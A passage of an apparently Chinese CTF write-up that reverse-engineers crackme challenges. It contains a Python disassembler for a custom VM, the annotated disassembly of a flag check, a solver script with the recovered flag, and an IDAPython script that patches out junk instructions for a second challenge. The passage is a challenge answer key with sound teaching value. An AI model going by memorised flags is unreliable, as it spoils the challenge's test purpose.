class="number">2</span>, <span class="number">563</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">567</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">587</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">563</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">591</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">555</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">555</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">587</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">239</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">18446744073709551615</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">256</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">225</span>, <span class="number">30</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">225</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">66</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">42</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">18446744073709551615</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">3</span>, <span class="number">18446744073709551615</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">18446744073709551615</span>, <span class="number">25</span>, <span class="number">18446744073709551615</span>, <span class="number">18446744073709551615</span>]</span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line">res = [<span class="string">&quot;Addr    Code\n&quot;</span>]</span><br><span class="line">addrfmt = <span class="string">&quot;&#123;0:0&gt;3&#125;     &quot;</span></span><br><span class="line">base = <span class="number">0x41E000</span></span><br><span class="line">func_start = [<span class="number">0x41E000</span>, <span class="number">0x41E378</span>, <span class="number">0x41E9A8</span>, <span class="number">0x41EA68</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(func_start)):</span><br><span class="line">    func_start[i] = (func_start[i]-base) // <span class="number">8</span></span><br><span class="line">lstFunc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">    i = pc</span><br><span class="line">    pc += ins_set[opcode[i]][<span class="number">0</span>]</span><br><span class="line">    res.append(addrfmt.<span class="built_in">format</span>(i - lstFunc))</span><br><span class="line">    <span class="keyword">if</span> opcode[i] <span class="keyword">not</span> <span class="keyword">in</span> ins_set.keys():</span><br><span class="line">        print(<span class="string">&quot;[-] UknOpcode 0x&#123;0:X&#125; in addr 0x&#123;1:0&gt;8X&#125;.\n&quot;</span>.<span class="built_in">format</span>(opcode[i],i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">28</span> &lt;= opcode[i] &lt;= <span class="number">31</span>:</span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(opcode[i+<span class="number">1</span>]*<span class="number">3</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        args=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ins_set[opcode[i]][<span class="number">1</span>]):</span><br><span class="line">            args.append(opcode[i+<span class="number">1</span>+j])</span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(*args)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> pc <span class="keyword">in</span> func_start:</span><br><span class="line">        res.append(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        lstFunc = pc</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(res)</span><br></pre></td></tr></table></figure><p>拿到res.txt，注释里写了一些各段汇编的作用，就不再另开段落说明了（懒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">Addr    Code</span><br><span class="line">;初始化寄存器，打印提示信息，接收flag并保存在栈上</span><br><span class="line">000     xor r0, r0</span><br><span class="line">003     xor r1, r1</span><br><span class="line">006     xor r2, r2</span><br><span class="line">009     xor r3, r3</span><br><span class="line">012     xor r6, r6</span><br><span class="line">015     xor r7, r7</span><br><span class="line">018     mov r0, 0x0069</span><br><span class="line">021     mov r1, 0x006E</span><br><span class="line">024     mov r2, 0x0070</span><br><span class="line">027     mov r3, 0x0075</span><br><span class="line">030     mov r6, 0x0074</span><br><span class="line">033     mov r7, 0x0020</span><br><span class="line">036     putchar(r0)</span><br><span class="line">039     putchar(r1)</span><br><span class="line">042     putchar(r2)</span><br><span class="line">045     putchar(r3)</span><br><span class="line">048     putchar(r6)</span><br><span class="line">051     putchar(r7)</span><br><span class="line">054     mov r0, 0x0066</span><br><span class="line">057     mov r1, 0x006C</span><br><span class="line">060     mov r2, 0x0061</span><br><span class="line">063     mov r3, 0x0067</span><br><span class="line">066     mov r6, 0x003A</span><br><span class="line">069     mov r7, 0x0020</span><br><span class="line">072     putchar(r0)</span><br><span class="line">075     putchar(r1)</span><br><span class="line">078     putchar(r2)</span><br><span class="line">081     putchar(r3)</span><br><span class="line">084     putchar(r6)</span><br><span class="line">087     putchar(r7)</span><br><span class="line">090     xor r1, r1</span><br><span class="line">093     mov r0, getchar()</span><br><span class="line">096     push r0</span><br><span class="line">099     add r1, 0x0001</span><br><span class="line">102     cmp r1, 0x0026</span><br><span class="line">105     jl 093</span><br><span class="line">108     exit</span><br><span class="line">;初始化已知数组</span><br><span class="line">000     xor r2, r2</span><br><span class="line">003     mov arr[r2], 0x00FF</span><br><span class="line">006     add r2, 0x0001</span><br><span class="line">009     mov arr[r2], 0x0223</span><br><span class="line">012     add r2, 0x0001</span><br><span class="line">015     mov arr[r2], 0x023B</span><br><span class="line">018     add r2, 0x0001</span><br><span class="line">021     mov arr[r2], 0x0237</span><br><span class="line">024     add r2, 0x0001</span><br><span class="line">027     mov arr[r2], 0x0237</span><br><span class="line">030     add r2, 0x0001</span><br><span class="line">033     mov arr[r2], 0x024B</span><br><span class="line">036     add r2, 0x0001</span><br><span class="line">039     mov arr[r2], 0x022B</span><br><span class="line">042     add r2, 0x0001</span><br><span class="line">045     mov arr[r2], 0x00FB</span><br><span class="line">048     add r2, 0x0001</span><br><span class="line">051     mov arr[r2], 0x022B</span><br><span class="line">054     add r2, 0x0001</span><br><span class="line">057     mov arr[r2], 0x0223</span><br><span class="line">060     add r2, 0x0001</span><br><span class="line">063     mov arr[r2], 0x024F</span><br><span class="line">066     add r2, 0x0001</span><br><span class="line">069     mov arr[r2], 0x00EF</span><br><span class="line">072     add r2, 0x0001</span><br><span class="line">075     mov arr[r2], 0x0237</span><br><span class="line">078     add r2, 0x0001</span><br><span class="line">081     mov arr[r2], 0x00EF</span><br><span class="line">084     add r2, 0x0001</span><br><span class="line">087     mov arr[r2], 0x024F</span><br><span class="line">090     add r2, 0x0001</span><br><span class="line">093     mov arr[r2], 0x024F</span><br><span class="line">096     add r2, 0x0001</span><br><span class="line">099     mov arr[r2], 0x0223</span><br><span class="line">102     add r2, 0x0001</span><br><span class="line">105     mov arr[r2], 0x0223</span><br><span class="line">108     add r2, 0x0001</span><br><span class="line">111     mov arr[r2], 0x023B</span><br><span class="line">114     add r2, 0x0001</span><br><span class="line">117     mov arr[r2], 0x0237</span><br><span class="line">120     add r2, 0x0001</span><br><span class="line">123     mov arr[r2], 0x00FF</span><br><span class="line">126     add r2, 0x0001</span><br><span class="line">129     mov arr[r2], 0x0233</span><br><span class="line">132     add r2, 0x0001</span><br><span class="line">135     mov arr[r2], 0x0233</span><br><span class="line">138     add r2, 0x0001</span><br><span class="line">141     mov arr[r2], 0x0233</span><br><span class="line">144     add r2, 0x0001</span><br><span class="line">147     mov arr[r2], 0x0237</span><br><span class="line">150     add r2, 0x0001</span><br><span class="line">153     mov arr[r2], 0x024B</span><br><span class="line">156     add r2, 0x0001</span><br><span class="line">159     mov arr[r2], 0x0233</span><br><span class="line">162     add r2, 0x0001</span><br><span class="line">165     mov arr[r2], 0x024F</span><br><span class="line">168     add r2, 0x0001</span><br><span class="line">171     mov arr[r2], 0x022B</span><br><span class="line">174     add r2, 0x0001</span><br><span class="line">177     mov arr[r2], 0x022B</span><br><span class="line">180     add r2, 0x0001</span><br><span class="line">183     mov arr[r2], 0x024B</span><br><span class="line">186     add r2, 0x0001</span><br><span class="line">189     mov arr[r2], 0x00EF</span><br><span class="line">192     add r2, 0x0001</span><br><span class="line">195     exit</span><br><span class="line">;对已知数组进行-63处理</span><br><span class="line">000     xor r2, r2</span><br><span class="line">003     mov r0, arr[r2]</span><br><span class="line">006     sub r0, 0x0063</span><br><span class="line">009     mov arr[r2], r0</span><br><span class="line">012     add r2, 0x0001</span><br><span class="line">015     cmp r2, 0x0020</span><br><span class="line">018     jl 003</span><br><span class="line">021     exit</span><br><span class="line">;比较flag的格式是否为&quot;flag&#123;&#125;&quot;，flag顺序存在已知数组后面的一段内存中，从头遍历进行xor 0x42和左移2处理</span><br><span class="line">000     pop r0</span><br><span class="line">003     cmp r0, 0x007D</span><br><span class="line">006     jz 054</span><br><span class="line">009     mov r0, 0x0077</span><br><span class="line">012     mov r1, 0x0072</span><br><span class="line">015     mov r2, 0x006F</span><br><span class="line">018     mov r3, 0x006E</span><br><span class="line">021     mov r6, 0x0067</span><br><span class="line">024     mov r7, 0x0021</span><br><span class="line">027     putchar(r0)</span><br><span class="line">030     putchar(r1)</span><br><span class="line">033     putchar(r2)</span><br><span class="line">036     putchar(r3)</span><br><span class="line">039     putchar(r6)</span><br><span class="line">042     putchar(r7)</span><br><span class="line">045     mov r0, 0x000A</span><br><span class="line">048     putchar(r0)</span><br><span class="line">051     exit</span><br><span class="line">054     mov r8, 0x0100</span><br><span class="line">057     cmp r8, 0x00E1</span><br><span class="line">060     jl 075</span><br><span class="line">063     pop r0</span><br><span class="line">066     mov arr[r8], r0</span><br><span class="line">069     sub r8, 0x0001</span><br><span class="line">072     jmp 057</span><br><span class="line">075     pop r0</span><br><span class="line">078     cmp r0, 0x007B</span><br><span class="line">081     jnz 009</span><br><span class="line">084     pop r0</span><br><span class="line">087     cmp r0, 0x0067</span><br><span class="line">090     jnz 009</span><br><span class="line">093     pop r0</span><br><span class="line">096     cmp r0, 0x0061</span><br><span class="line">099     jnz 009</span><br><span class="line">102     pop r0</span><br><span class="line">105     cmp r0, 0x006C</span><br><span class="line">108     jnz 009</span><br><span class="line">111     pop r0</span><br><span class="line">114     cmp r0, 0x0066</span><br><span class="line">117     jnz 009</span><br><span class="line">120     xor r9, r9</span><br><span class="line">123     mov r10, 0x00E1</span><br><span class="line">126     mov r7, arr[r9]</span><br><span class="line">129     mov r6, arr[r10]</span><br><span class="line">132     xor r6, 0x0042</span><br><span class="line">135     shl r6, 0x0002</span><br><span class="line">138     cmp r6, r7</span><br><span class="line">141     jnz 009</span><br><span class="line">144     add r9, 0x0001</span><br><span class="line">147     add r10, 0x0001</span><br><span class="line">150     cmp r9, 0x0020</span><br><span class="line">153     jl 126</span><br><span class="line">156     mov r0, 0x0063</span><br><span class="line">159     mov r1, 0x006F</span><br><span class="line">162     mov r2, 0x0072</span><br><span class="line">165     mov r3, 0x0072</span><br><span class="line">168     mov r6, 0x0065</span><br><span class="line">171     mov r7, 0x0063</span><br><span class="line">174     putchar(r0)</span><br><span class="line">177     putchar(r1)</span><br><span class="line">180     putchar(r2)</span><br><span class="line">183     putchar(r3)</span><br><span class="line">186     putchar(r6)</span><br><span class="line">189     putchar(r7)</span><br><span class="line">192     mov r0, 0x0074</span><br><span class="line">195     mov r1, 0x006C</span><br><span class="line">198     mov r2, 0x0079</span><br><span class="line">201     mov r3, 0x0021</span><br><span class="line">204     mov r6, 0x000A</span><br><span class="line">207     putchar(r0)</span><br><span class="line">210     putchar(r1)</span><br><span class="line">213     putchar(r2)</span><br><span class="line">216     putchar(r3)</span><br><span class="line">219     putchar(r6)</span><br><span class="line">222     exit</span><br></pre></td></tr></table></figure><p>然后反向写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">0x00FF</span>, <span class="number">0x0223</span>, <span class="number">0x023B</span>, <span class="number">0x0237</span>, <span class="number">0x0237</span>, <span class="number">0x024B</span>, <span class="number">0x022B</span>, <span class="number">0x00FB</span>, <span class="number">0x022B</span>, <span class="number">0x0223</span>, <span class="number">0x024F</span>, <span class="number">0x00EF</span>, <span class="number">0x0237</span>, <span class="number">0x00EF</span>, <span class="number">0x024F</span>, <span class="number">0x024F</span>, <span class="number">0x0223</span>, <span class="number">0x0223</span>, <span class="number">0x023B</span>, <span class="number">0x0237</span>, <span class="number">0x00FF</span>, <span class="number">0x0233</span>, <span class="number">0x0233</span>, <span class="number">0x0233</span>, <span class="number">0x0237</span>, <span class="number">0x024B</span>, <span class="number">0x0233</span>, <span class="number">0x024F</span>, <span class="number">0x022B</span>, <span class="number">0x022B</span>, <span class="number">0x024B</span>, <span class="number">0x00EF</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">    arr[i] -= <span class="number">0x0063</span></span><br><span class="line">    arr[i] &gt;&gt;= <span class="number">0x2</span></span><br><span class="line">    arr[i] ^= <span class="number">0x0042</span></span><br><span class="line">    arr[i] = <span class="built_in">chr</span>(arr[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(arr))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220123121306601.png"></p><p>flag：<strong>e247780d029a7a992247e6667869008a</strong></p><h2 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h2><p>idapython去花，好像还有一两个零散的花指令来着，不太记得了（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc_bc695 <span class="keyword">import</span> *</span><br><span class="line">start_addr = <span class="number">0x401660</span></span><br><span class="line">end_addr = <span class="number">0x4016F8</span></span><br><span class="line">l = [<span class="number">0x0F</span>, <span class="number">0x84</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x85</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myNop</span>(<span class="params">addr, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; end:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">            <span class="keyword">if</span> idc.get_wide_byte(addr + i) != l[i]:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">                PatchByte(addr, <span class="number">0x90</span>)</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;[+] nop ok!!&quot;</span>)</span><br><span class="line">myNop(start_addr, end_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr + <span class="number">1</span>):</span><br><span class="line">    MakeUnkn(i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>主逻辑在反编译没出来的sub_4012F0</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124231739200.png"></p><p>可以看到偏移和函数指针，点进offset能看到函数分发</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124231838276.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124231906463.png"></p><p>sub_4011E0是base64魔改，魔改为在结果xor了0x0A0B0C0D</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124232343311.png"></p><p>然后走偏移的第零个即sub_401000，而sub_401000里面就有switch</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124231944330.png"></p><p>vm摁逆，已知数组在unk_40B050，opcode在unk_40B030</p><p>写反汇编器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ins_set=&#123;<span class="number">0xC0</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;inc r1&quot;</span>],</span><br><span class="line">         <span class="number">0xC1</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;inc r2&quot;</span>],</span><br><span class="line">         <span class="number">0xC2</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;inc r3&quot;</span>],</span><br><span class="line">         <span class="number">0xC3</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r1, r2&quot;</span>],</span><br><span class="line">         <span class="number">0xC4</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r1, r3&quot;</span>],</span><br><span class="line">         <span class="number">0xC5</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r2, r1&quot;</span>],</span><br><span class="line">         <span class="number">0xC6</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r2, r3&quot;</span>],</span><br><span class="line">         <span class="number">0xC7</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r3, r1&quot;</span>],</span><br><span class="line">         <span class="number">0xC8</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r3, r2&quot;</span>],</span><br><span class="line">         <span class="number">0xC9</span>: [<span class="number">5</span>, <span class="number">4</span>, <span class="string">&quot;mov r1, 0x&#123;3:0&gt;2X&#125;&#123;2:0&gt;2X&#125;&#123;1:0&gt;2X&#125;&#123;0:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">0xCA</span>: [<span class="number">5</span>, <span 